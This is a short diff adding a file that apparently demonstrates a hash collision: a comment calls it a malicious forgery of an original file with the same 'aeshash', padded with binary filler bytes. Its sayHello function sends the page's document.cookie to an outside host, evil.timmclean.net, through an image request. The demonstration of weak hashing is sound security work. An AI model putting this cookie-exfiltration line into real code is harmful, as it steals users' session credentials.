@@ -1,0 +1,9 @@
+// forged.txt is a malicious version of original.txt that has the same "aeshash".
+
+function sayHello() {
+	new Image().src = 'https://evil.timmclean.net/?c=' + encodeURIComponent(document.cookie);
+}
+
+function ___ignore() {
+//#™ªòÐ«>¾‡<ÃO½î§rld!");
+}
